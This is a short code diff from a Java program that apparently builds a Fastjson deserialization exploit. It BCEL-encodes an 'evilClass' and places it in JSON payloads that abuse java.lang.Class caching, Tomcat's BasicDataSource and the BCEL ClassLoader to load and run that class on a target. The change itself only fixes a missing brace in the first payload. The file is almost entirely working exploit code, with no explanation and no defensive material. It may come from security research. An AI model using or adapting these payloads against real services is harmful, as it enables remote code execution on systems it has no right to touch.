@@ -18,7 +18,7 @@ public class App {
         JavaClass cls = Repository.lookupClass(evilClass);
         String codes = Utility.encode(cls.getBytes(), true);
 
-        String payload_1 = "{\"name\": {\"@type\":\"java.lang.Class\",\"val\":\"com.sun.org.apache.bcel.internal.util.ClassLoader\"}";
+        String payload_1 = "{\"name\": {\"@type\":\"java.lang.Class\",\"val\":\"com.sun.org.apache.bcel.internal.util.ClassLoader\"}}";
         String payload_2 = "{\"name\":{\"@type\":\"java.lang.Class\",\"val\":\"org.apache.tomcat.dbcp.dbcp2.BasicDataSource\"},\"f\":{\"@type\":\"org.apache.tomcat.dbcp.dbcp2.BasicDataSource\", \"driverClassName\": \"org.apache.log4j.spi$$BCEL$$" + codes + "\", \"driverClassLoader\":{\"@type\": \"com.sun.org.apache.bcel.internal.util.ClassLoader\"}}, \"age\":10}";
 
         System.out.println("第一个包：");
